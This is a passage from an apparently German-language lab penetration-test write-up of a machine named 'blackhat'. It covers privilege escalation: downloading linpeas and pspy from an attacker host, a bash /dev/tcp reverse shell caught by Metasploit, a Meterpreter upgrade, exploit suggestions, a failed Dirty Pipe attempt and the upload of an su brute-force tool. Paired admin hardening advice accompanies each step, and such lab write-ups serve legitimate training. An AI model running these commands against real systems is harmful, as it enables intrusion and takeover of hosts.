+                **Empfehlung (Pentester):** Sammeln Sie immer die genaue OS-Version. Dies ist entscheidend für die Auswahl passender Kernel-Exploits oder paketbasierter PE-Methoden. Dokumentieren Sie auch gescheiterte Versuche und Sackgassen – dies zeigt den Aufwand und die getesteten Hypothesen.
+                <br>**Empfehlung (Admin):** Halten Sie Systeme aktuell, um bekannte Schwachstellen zu schließen. Überprüfen Sie Konfigurationsdateien und Benutzer-Home-Verzeichnisse auf ungewöhnliche Einstellungen oder Dateien, die Sicherheitsrisiken darstellen könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/home/darkdante$ <span class="command">cat /etc/*leas*</span>
+<span class="command">PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"</span>
+<span class="command">NAME="Debian GNU/Linux"</span>
+<span class="command">VERSION_ID="11"</span>
+<span class="command">VERSION="11 (bullseye)"</span>
+<span class="command">VERSION_CODENAME=bullseye</span>
+<span class="command">ID=debian</span>
+<span class="command">HOME_URL="[Link: https://www.debian.org/ | Ziel: https://www.debian.org/]"</span>
+<span class="command">SUPPORT_URL="[Link: https://www.debian.org/support | Ziel: https://www.debian.org/support]"</span>
+<span class="command">BUG_REPORT_URL="[Link: https://bugs.debian.org/ | Ziel: https://bugs.debian.org/]"</span>
+</pre>
+                </div>
+            </div>
+            <pre>
+Ein seltsamer .bash_history Symlink:
+<span class="command">lrwxrwxrwx 1 root root 9 Nov 11 2022 .bash_history -&gt; /dev/null</span>
+
+<span class="password">aber alles nur sackgasse leider...</span>
+<span class="password">keine schreibrechte daher meine überlegung racecondition gekippt...</span>
+</pre>
+
+            <p class="analysis">
+                **Analyse:** Um die Privilege Escalation auf dem System systematisch zu untersuchen, lade ich zwei gängige Linux-Enumerations-Skripte von meiner Angreifer-Maschine (`192.168.2.199`) in das beschreibbare `/tmp` Verzeichnis auf dem Zielsystem herunter: `pspy64` (ein Tool zur Überwachung von Prozessen ohne Root-Rechte) und `linpeas.sh` (ein umfassendes PE-Enumerationsskript). Dazu starte ich einen einfachen HTTP-Server auf meiner Maschine (Port 8000) und nutze `wget` auf dem Zielsystem.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Hochladen der Tools war erfolgreich. Diese Skripte sind sehr wertvoll, da sie automatisch eine Vielzahl von potenziellen PE-Vektoren auf dem System überprüfen und Ergebnisse hervorheben, die man bei manueller Enumeration leicht übersehen könnte (z.B. Kernel-Schwachstellen, unsichere Dateiberechtigungen, Cronjobs, SUID/SGID-Binaries, Konfigurationsfehler). Das `/tmp` Verzeichnis ist ein Standardort für solche temporären Dateien, da es oft für alle Benutzer schreibbar ist.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie standardmäßige Enumerations-Skripte wie `linpeas.sh` und `pspy64` (oder ähnliche), um die lokale PE-Phase zu beschleunigen und zu standardisieren. Laden Sie diese in ein beschreibbares Verzeichnis wie `/tmp` hoch.
+                <br>**Empfehlung (Admin):** Überwachen Sie die Erstellung von ausführbaren Dateien oder Skripten in temporären Verzeichnissen (`/tmp`, `/dev/shm`) und anderen unsicheren Orten. Implementieren Sie `noexec`-Flags für `/tmp` falls möglich, um die Ausführung von Binaries dort zu verhindern.
+            </p>
+            <p>
+                Hochladen von Enumerations-Skripten auf das Zielsystem:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">wget 192.168.2.199:8000/pspy64</span>
+<span class="password">--2025-06-09 23:38:41--  http://192.168.2.199:8000/pspy64</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 3078592 (2.9M) [application/octet-stream]</span>
+<span class="password">Saving to: ‘pspy64’</span>
+
+<span class="password">pspy64                  100%[=============================&gt;]   2.94M  --.-KB/s    in 0.02s</span>
+
+<span class="password">2025-06-09 23:38:41 (189 MB/s) - ‘pspy64’ saved [3078592/3078592]</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">wget 192.168.2.199:8000/linpeas.sh</span>
+<span class="password">--2025-06-09 23:38:44--  http://192.168.2.199:8000/linpeas.sh</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 827827 (808K) [text/x-sh]</span>
+<span class="password">Saving to: ‘linpeas.sh’</span>
+
+<span class="password">linpeas.sh              100%[=============================&gt;] 808.42K  --.-KB/s    in 0.01s</span>
+
+<span class="password">2025-06-09 23:38:44 (74.6 MB/s) - ‘linpeas.sh’ saved [827827/827827]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich führe das `linpeas.sh` Skript aus (`./linpeas.sh`) und filtere die Ausgabe mit `grep 'CVEs Check' -A 10`, um die Ergebnisse der CVE-Überprüfung anzuzeigen. LinPEAS prüft automatisch auf bekannte Kernel- und Software-Schwachstellen. Die Ausgabe listet potenzielle Anfälligkeiten auf.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** LinPEAS identifiziert mehrere potenzielle Kernel-Schwachstellen, darunter CVE-2022-0847 (Dirty Pipe) und CVE-2022-2588. Es findet auch generelle Schwachstellen-Kategorien wie "Writable PATH abuses". Die Auflistung spezifischer CVEs und allgemeiner PE-Kategorien gibt mir konkrete Ansatzpunkte für die Privilege Escalation. Insbesondere Dirty Pipe (CVE-2022-0847) ist eine bekannte und oft ausnutzbare Kernel-Schwachstelle für die PE auf Root.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Untersuchen Sie die von LinPEAS gemeldeten Schwachstellen, insbesondere die Kernel-Exploits. Dirty Pipe ist ein vielversprechender Kandidat. Suchen Sie auf Exploit-Datenbanken nach fertigen Exploits für die identifizierten CVEs und das System (Debian 11, Kernel 5.10.0).
+                <br>**Empfehlung (Admin):** Aktualisieren Sie den System-Kernel und alle installierten Pakete regelmäßig, um bekannte Schwachstellen zu schließen. Führen Sie regelmäßig Scans mit Tools wie LinPEAS durch, um Konfigurationsprobleme oder ungepatchte Schwachstellen zu finden. Stellen Sie sicher, dass Benutzer-PATHs keine beschreibbaren Verzeichnisse enthalten, die für PATH-Hijacking ausgenutzt werden könnten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">./linpeas.sh | grep 'CVEs Check' -A 10</span>
+<span class="command">. . . . . .</span>
+
+<span class="password">╔══════════╣ CVEs Check</span>
+<span class="password">Potentially Vulnerable to CVE-2022-0847</span>
+<span class="password">Potentially Vulnerable to CVE-2022-2588</span>
+
+
+<span class="password">╔══════════╣ PATH</span>
+<span class="password">╚ [Link: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses | Ziel: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses]</span>
+<span class="command">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+<span class="command">New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span>
+
+
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Als Alternative oder Ergänzung zur manuellen Reverse Shell setze ich Metasploit ein, um eine stabilere Meterpreter-Sitzung zu erhalten und automatisch nach Exploits zu suchen. Ich starte Metasploit im Quiet-Modus (`-q`) und führe direkt den Befehl `use multi/handler` aus, um einen Listener einzurichten. Ich setze das Payload auf `linux/x64/shell_reverse_tcp` (da das System 64-bit Linux ist), setze meine Angreifer-IP (`LHOST`) und den Listener-Port (`LPORT`, hier 4445, um Konflikte zu vermeiden oder weil 4444 belegt war). Ich zeige die Optionen, um die Konfiguration zu verifizieren, und starte dann den Handler (`run`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Metasploit-Handler ist erfolgreich auf Port 4445 gestartet und wartet auf eine eingehende Verbindung. Die Verwendung von Metasploit bietet viele Vorteile, insbesondere für die Post-Exploitation und die Nutzung automatisierter Module wie dem `local_exploit_suggester`, das ich als Nächstes verwenden werde. Die Reverse Shell auf Port 4444, die ich zuvor manuell initiiert habe, hat mir bereits eine `www-data` Shell gegeben. Dieser Metasploit-Handler wäre eine alternative Methode, um diese erste Shell zu empfangen oder eine stabilere Sitzung zu initiieren.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie Frameworks wie Metasploit für das Management von Shells und den Einsatz automatisierter Post-Exploitation-Module. Richten Sie immer einen passenden Listener ein.
+                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlung zur Filterung ausgehenden Traffics). Das Erkennen von Metasploit-Signaturen im Netzwerkverkehr kann auf Angriffe hindeuten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/dirty_pipe]<br>└─# <span class="command">msfconsole -q -x 'use multi/handler'</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">[*] Using configured payload generic/shell_reverse_tcp</span>
+<span class="metasploit-prompt">msf6 exploit(multi/handler) &gt; </span><span class="command">set PAYLOAD linux/x64/shell_reverse_tcp</span>
+<span class="command">PAYLOAD =&gt; linux/x64/shell_reverse_tcp</span>
+<span class="metasploit-prompt">msf6 exploit(multi/handler) &gt; </span><span class="command">set LHOST 192.168.2.199</span>
+<span class="command">LHOST =&gt; 192.168.2.199</span>
+<span class="metasploit-prompt">msf6 exploit(multi/handler) &gt; </span><span class="command">options</span>
+
+<span class="command">Payload options (linux/x64/shell_reverse_tcp):</span>
+
+   <span class="command">Name   Current Setting  Required  Description</span>
+   <span class="command">----   ---------------  --------  -----------</span>
+   <span class="command">LHOST  192.168.2.199    yes       The listen address (an interface may be specified)</span>
+   <span class="command">LPORT  4444             yes       The listen port</span>
+
+
+<span class="command">Exploit target:</span>
+
+   <span class="command">Id  Name</span>
+   <span class="command">--  ----</span>
+   <span class="command">0   Wildcard Target</span>
+
+
+
+<span class="command">View the full module info with the info, or info -d command.</span>
+
+<span class="metasploit-prompt">msf6 exploit(multi/handler) &gt; </span><span class="command">set lport 4445</span>
+<span class="command">lport =&gt; 4445</span>
+<span class="metasploit-prompt">msf6 exploit(multi/handler) &gt; </span><span class="command">run</span>
+<span class="password">[*] Started reverse TCP handler on 192.168.2.199:4445</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich zeige hier die Ausführung des Bash Reverse Shell Payloads auf dem Zielsystem über die zuvor gefundene Backdoor (`bash -c 'bash -i >& /dev/tcp/192.168.2.199/4445 0>&1'`). Dieser Befehl wird wahrscheinlich über den Backdoor-Header ausgeführt, auch wenn der `curl`-Befehl hier nicht explizit gezeigt wird, da er die Shell auf meinem Metasploit-Handler auf Port 4445 landet. Die Ausgabe zeigt die Bestätigung im Metasploit-Handler, dass die Verbindung hergestellt und eine Shell-Sitzung geöffnet wurde.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** **Erfolg! Eine Reverse Shell wurde auf dem Metasploit-Handler etabliert.** Dies bestätigt nicht nur die RCE-Fähigkeit, sondern gibt mir nun eine von Metasploit verwaltete Shell-Sitzung, was für die weitere Automatisierung und Nutzung von Post-Exploitation-Modulen von Vorteil ist. Der Prompt `www-data@blackhat:/tmp$` in der Shell-Banner-Ausgabe bestätigt erneut, dass ich als `www-data` agiere und im `/tmp` Verzeichnis gelandet bin.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie die Metasploit-Sitzung, um weitere Enumeration und Privilege Escalation durchzuführen, idealerweise durch Upgrade zu einer Meterpreter-Sitzung.
+                <br>**Empfehlung (Admin):** (Wiederholung der dringenden Empfehlung zur Behebung der RCE-Backdoor und Filterung ausgehenden Traffics).
+            </p>
+            <p>
+                Auslösen der Reverse Shell zu meinem Metasploit-Handler:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.2.199/4445 0&gt;&amp;1'</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">[*] Started reverse TCP handler on 192.168.2.199:4445</span>
+<span class="password">[*] Command shell session 1 opened (192.168.2.199:4445 -&gt; 192.168.2.34:56398) at 2025-06-09 23:58:54 +0200</span>
+
+
+<span class="command">Shell Banner:</span>
+<span class="password">www-data@blackhat:/tmp$</span>
+<span class="command">-----</span>
+<span class="password">www-data@blackhat:/tmp$</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Innerhalb von Metasploit wechsle ich zur Post-Exploitation-Phase. Ich wähle das Modul `post/multi/manage/shell_to_meterpreter` (mit `use 100` basierend auf der ID aus einem vorherigen `search` oder Wissen über das Modul). Dieses Modul versucht, eine einfache Command Shell (wie die gerade erhaltene) in eine fortgeschrittenere Meterpreter-Sitzung upzugraden. Ich setze die Option `SESSION` auf die ID der erhaltenen Shell-Sitzung (hier 1) und starte das Modul. Das Modul richtet automatisch einen Handler für die Meterpreter-Verbindung ein (Standardport 4433).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Das Upgrade auf Meterpreter war erfolgreich. Metasploit startete einen Handler auf Port 4433, sendete die Meterpreter-Stage an die Zielmaschine und öffnete eine neue Meterpreter-Sitzung (Session 2). Eine Meterpreter-Sitzung ist viel leistungsfähiger als eine einfache Shell, da sie eine breite Palette von eingebauten Befehlen und Modulen für Enumeration, Datei-Operationen, Prozess-Management und Privilege Escalation bietet, ohne zusätzliche Binaries auf das Zielsystem hochladen zu müssen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Versuchen Sie immer, eine einfache Shell in eine Meterpreter-Sitzung upzugraden, wenn Sie Metasploit verwenden. Nutzen Sie die Funktionen der Meterpreter-Sitzung für die weitere Post-Exploitation.
+                <br>**Empfehlung (Admin):** Achten Sie auf ungewöhnlichen Netzwerkverkehr, der durch Stage-Übertragung für Meterpreter oder ähnliche Tools verursacht wird. Host-basierte Intrusion Detection Systeme können solche Aktivitäten erkennen.
+            </p>
+            <p>
+                Upgrade der Command Shell auf eine Meterpreter-Sitzung:
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="metasploit-prompt">msf6 post(multi/handler) &gt; </span><span class="command">use 100</span>
+<span class="metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; </span><span class="command">options</span>
+
+<span class="command">Module options (post/multi/manage/shell_to_meterpreter):</span>
+
+   <span class="command">Name     Current Setting  Required  Description</span>
+   <span class="command">----     ---------------  --------  -----------</span>
+   <span class="command">HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span>
+   <span class="command">LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span>
+   <span class="command">LPORT    4433             yes       Port for payload to connect to.</span>
+   <span class="command">SESSION                   yes       The session to run this module on</span>
+
+
+<span class="command">View the full module info with the info, or info -d command.</span>
+
+<span class="metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; </span><span class="command">set session 1</span>
+<span class="command">session =&gt; 1</span>
+<span class="metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; </span><span class="command">run</span>
+<span class="password">[*] Upgrading session ID: 1</span>
+<span class="password">[*] Starting exploit/multi/handler</span>
+<span class="password">[*] Started reverse TCP handler on 192.168.2.199:4433</span>
+<span class="password">[*] Sending stage (1017704 bytes) to 192.168.2.34</span>
+<span class="password">[*] Meterpreter session 2 opened (192.168.2.199:4433 -&gt; 192.168.2.34:50028) at 2025-06-10 00:01:09 +0200</span>
+<span class="password">[*] Command stager progress: 100.00% (773/773 bytes)</span>
+<span class="password">[*] Post module execution completed</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Innerhalb der Meterpreter-Sitzung suche ich nach lokalen Privilege Escalation Exploits, die für das Zielsystem relevant sein könnten. Ich verwende den Befehl `search suggester` und wähle dann das Modul `post/multi/recon/local_exploit_suggester` (ID 0) aus, setze die aktuelle Meterpreter-Sitzung (Session 2) und starte das Modul (`run`). Dieses Modul automatisiert den Prozess des Überprüfens des Zielsystems auf bekannte Schwachstellen und schlägt passende Metasploit-Exploits vor.
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Der Exploit Suggester hat mehrere potenzielle Schwachstellen identifiziert, für die Metasploit passende Exploits hat. Besonders hervorzuheben sind `cve_2022_0847_dirtypipe` (Dirty Pipe), `glibc_tunables_priv_esc`, `netfilter_priv_esc_ipv4` und `su_login`. Dirty Pipe wurde als potenziell ausnutzbar basierend auf der Kernelversion (5.10.0) identifiziert, was die Ergebnisse von LinPEAS bestätigt. Der `sudoedit_bypass_priv_esc` Exploit wird als nicht ausnutzbar markiert, da die notwendige editierbare Datei nicht gefunden wurde. Diese Liste gibt mir konkrete, geprüfte Exploits, die ich versuchen kann, um meine Privilegien zu erhöhen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Nutzen Sie lokale Exploit Suggester, um schnell eine Liste potenzieller PE-Vektoren zu erhalten. Beginnen Sie mit der Ausnutzung der vielversprechendsten Exploits, wie Dirty Pipe in diesem Fall.
+                <br>**Empfehlung (Admin):** Aktualisieren Sie den Kernel und die Systembibliotheken, um bekannte Schwachstellen zu schließen (CVE-2022-0847 und andere). Überprüfen Sie die Konfigurationen von Diensten und Dateien, auf die sich die vorgeschlagenen Exploits beziehen (z.B. glibc tunables, netfilter, su).
+            </p>
+            <p>
+                Verwendung des lokalen Exploit Suggesters in Metasploit:
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; </span><span class="command">search suggester</span>
+
+<span class="command">Matching Modules</span>
+<span class="command">================</span>
+
+   <span class="command">#  Name                                      Disclosure Date  Rank    Check  Description</span>
+   <span class="command">-  ----                                      ---------------  ----    -----  -----------</span>
+   <span class="command">0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester</span>
+
+
+<span class="command">Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester</span>
+
+<span class="metasploit-prompt">msf6 post(multi/manage/shell_to_meterpreter) &gt; </span><span class="command">use 0</span>
+<span class="metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><span class="command">set session 2</span>
+<span class="command">session =&gt; 2</span>
+<span class="metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><span class="command">run</span>
+<span class="password">[*] 192.168.2.34 - Collecting local exploits for x86/linux...</span>
+<span class="password">[*] 192.168.2.34 - 205 exploit checks are being tried...</span>
+<span class="password">[+] 192.168.2.34 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0</span>
+<span class="password">[+] 192.168.2.34 - exploit/linux/local/glibc_tunables_priv_esc: The target appears to be vulnerable. The glibc version (2.31-13+deb11u5) found on the target appears to be vulnerable</span>
+<span class="password">[+] 192.168.2.34 - exploit/linux/local/netfilter_priv_esc_ipv4: The target appears to be vulnerable.</span>
+<span class="password">[+] 192.168.2.34 - exploit/linux/local/su_login: The target appears to be vulnerable.</span>
+<span class="password">[+] 192.168.2.34 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Basierend auf den Vorschlägen des Exploit Suggesters wähle ich den Exploit `exploit/linux/local/cve_2022_0847_dirtypipe` (Dirty Pipe), da er oft zuverlässig ist. Ich setze die notwendigen Optionen: `LPORT` (auf 5555, für die Reverse Shell, die der Exploit liefern soll), `COMPILE` und `COMPILER` auf Auto (damit Metasploit den Exploit bei Bedarf auf dem Zielsystem kompiliert), `SESSION` auf die aktuelle Meterpreter-Sitzung (2) und `WRITABLE_DIR` auf `/tmp` (ein Verzeichnis, in das ich schreiben darf und in dem der Exploit temporäre Dateien ablegen kann). Schließlich setze ich `LHOST` auf meine Angreifer-IP und führe den Exploit aus (`run`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Metasploit bestätigt die Vulnerabilität des Ziels für Dirty Pipe. Der Exploit wird ausgeführt, die temporäre Datei wird geschrieben. Allerdings meldet Metasploit "Exploit completed, but no session was created.". Dies bedeutet, dass der Exploit zwar durchlief, aber aus irgendeinem Grund (z.B. Timing, spezifische Kernel-Patches, Umgebung) nicht zum Erhalt einer Root-Shell führte. Dies ist eine Sackgasse für diesen spezifischen Exploit, auch wenn der Suggester ihn als vielversprechend einstufte. Es ist wichtig, dies zu dokumentieren und andere PE-Vektoren zu verfolgen.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Lassen Sie sich von einem gescheiterten Exploit-Versuch nicht entmutigen. Verfolgen Sie andere PE-Vektoren aus der Liste des Suggesters oder aus der manuellen Enumeration. Dirty Pipe Exploits können manchmal empfindlich auf Timing oder Kernel-Varianten reagieren.
+                <br>**Empfehlung (Admin):** Patchen Sie den Kernel sofort, um CVE-2022-0847 (Dirty Pipe) und andere gemeldete Schwachstellen zu schließen.
+            </p>
+            <p>
+                Versuch, den Dirty Pipe Exploit (CVE-2022-0847) auszuführen:
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="metasploit-prompt">msf6 post(multi/recon/local_exploit_suggester) &gt; </span><span class="command">use exploit/linux/local/cve_2022_0847_dirtypipe</span>
+<span class="password">[*] Using configured payload linux/x64/meterpreter/reverse_tcp</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">options</span>
+
+<span class="command">Module options (exploit/linux/local/cve_2022_0847_dirtypipe):</span>
+
+   <span class="command">Name              Current Setting  Required  Description</span>
+   <span class="command">----              ---------------  --------  -----------</span>
+   <span class="command">COMPILE           Auto             yes       Compile on target (Accepted: Auto, True, False)</span>
+   <span class="command">COMPILER          Auto             yes       Compiler to use on target (Accepted: Auto, gcc, clang)</span>
+   <span class="command">SESSION                            yes       The session to run this module on</span>
+   <span class="command">SUID_BINARY_PATH  /bin/passwd      no        The path to a suid binary</span>
+   <span class="command">WRITABLE_DIR      /tmp             yes       A directory where we can write files</span>
+
+
+<span class="command">Payload options (linux/x64/meterpreter/reverse_tcp):</span>
+
+   <span class="command">Name   Current Setting  Required  Description</span>
+   <span class="command">----   ---------------  --------  -----------</span>
+   <span class="command">LHOST                   yes       The listen address (an interface may be specified)</span>
+   <span class="command">LPORT  4444             yes       The listen port</span>
+
+
+<span class="command">Exploit target:</span>
+
+   <span class="command">Id  Name</span>
+   <span class="command">--  ----</span>
+   <span class="command">0   Automatic</span>
+
+
+
+<span class="command">View the full module info with the info, or info -d command.</span>
+
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set lport 5555</span>
+<span class="command">lport =&gt; 5555</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set COMPILE           Auto</span>
+<span class="command">COMPILE =&gt; Auto</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set COMPILER          Auto</span>
+<span class="command">COMPILER =&gt; Auto</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set session 2</span>
+<span class="command">session =&gt; 2</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set WRITABLE_DIR      /tmp</span>
+<span class="command">WRITABLE_DIR =&gt; /tmp</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">set lhost 192.168.2.199</span>
+<span class="command">lhost =&gt; 192.168.2.199</span>
+<span class="metasploit-prompt">msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; </span><span class="command">run</span>
+<span class="password">[*] Started reverse TCP handler on 192.168.2.199:5555</span>
+<span class="password">[*] Running automatic check ("set AutoCheck false" to disable)</span>
+<span class="password">[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0</span>
+<span class="password">[*] Writing '/tmp/.kpuwxk' (35592 bytes) ...</span>
+<span class="password">[*] Executing exploit '/tmp/.kpuwxk /bin/passwd'</span>
+<span class="password">[*] Exploit completed, but no session was created.</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                **Analyse:** Ich dokumentiere die Vorbereitung und den Versuch, ein Brute-Force-Tool für das `su` Binary (`suForce`) und eine kleinere Wordlist (`rocksmall.txt`, erste 5000 Zeilen von `rockyou.txt`) auf das Zielsystem hochzuladen. Ich starte einen HTTP-Server auf meiner Maschine (Port 8000) und nutze `wget` in der `www-data` Shell, um die Dateien in `/tmp` herunterzuladen. Dann mache ich `suForce` ausführbar (`chmod +x suForce`) und zeige dessen Usage (`./suForce`).
+            </p>
+            <p class="evaluation">
+                **Bewertung:** Die Tools wurden erfolgreich hochgeladen und `suForce` ist ausführbar. Das Vorhandensein von `suForce` und der Wordlist deutet darauf hin, dass ein Brute-Force-Angriff auf das `su` Binary (das ein SUID-Binary ist) als PE-Vektor in Betracht gezogen wurde. Das `suForce` Tool ist für das Brute Forcing von Benutzernamen mit einer Wordlist gegen das `su` Kommando konzipiert.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Brute-Force-Angriffe können in schwach gesicherten Umgebungen effektiv sein. Das Hochladen angepasster Tools wie `suForce` ist ein Standardvorgehen.
+                <br>**Empfehlung (Admin):** Implementieren Sie Richtlinien für starke Passwörter und Brute-Force-Schutz (z.B. Account-Sperrung nach mehreren fehlgeschlagenen Login-Versuchen) für alle Benutzerkonten.
+            </p>
+            <p>
+                Vorbereitung und Hochladen von Tools für einen Brute-Force-Angriff auf `su`:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]<br>└─# <span class="command">head -n 5000 /usr/share/wordlists/rockyou.txt &gt; rocksmall.txt</span></div>
+                </div>
+                <div class="terminal"><pre></pre></div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]<br>└─# <span class="command">ll su*</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">suForce:</span>
+<span class="command">insgesamt 420</span>
+<span class="command">-rwxr-xr-x 1 root root   2692 11. Sep 2024  suForce</span>
+<span class="command">-rw-r--r-- 1 root root 161891 11. Sep 2024  techyou.txt</span>
+<span class="command">-rw-r--r-- 1 root root 100206 11. Sep 2024  top12000.txt</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">wget 192.168.2.199:8000/rocksmall.txt</span>
+<span class="password">--2025-06-10 00:12:39--  http://192.168.2.199:8000/rocksmall.txt</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 40481 (40K) [text/plain]</span>
+<span class="password">Saving to: ‘rocksmall.txt’</span>
+
+<span class="password">rocksmall.txt           100%[=============================&gt;]  39.53K  --.-KB/s    in 0s</span>
+
+<span class="password">2025-06-10 00:12:39 (282 MB/s) - ‘rocksmall.txt’ saved [40481/40481]</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">wget 192.168.2.199:8000/suForce</span>
+<span class="password">--2025-06-10 00:12:55--  http://192.168.2.199:8000/suForce</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="password">Length: 2692 (2.6K) [application/octet-stream]</span>
+<span class="password">Saving to: ‘suForce’</span>
+
+<span class="password">suForce                 100%[=============================&gt;]   2.63K  --.-KB/s    in 0.001s</span>
+
+<span class="password">2025-06-10 00:12:55 (4.00 MB/s) - ‘suForce’ saved [2692/2692]</span>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+www-data@blackhat:/tmp$ <span class="command">chmod +x suForce</span>
+www-data@blackhat:/tmp$ <span class="command">./suForce</span>
+            <span class="command">_____</span>
+ <span class="command">___ _   _ |  ___|__  _ __ ___ ___</span>
+<span class="command">/ __| | | || |_ / _ \| '__/ __/ _ \</span>
+<span class="command">\__ \ |_| ||  _| (_) | | | (_|  __/</span>
+<span class="command">|___/\__,_||_|  \___/|_|  \___\___|</span>
+<span class="command">-=================================-</span>
+
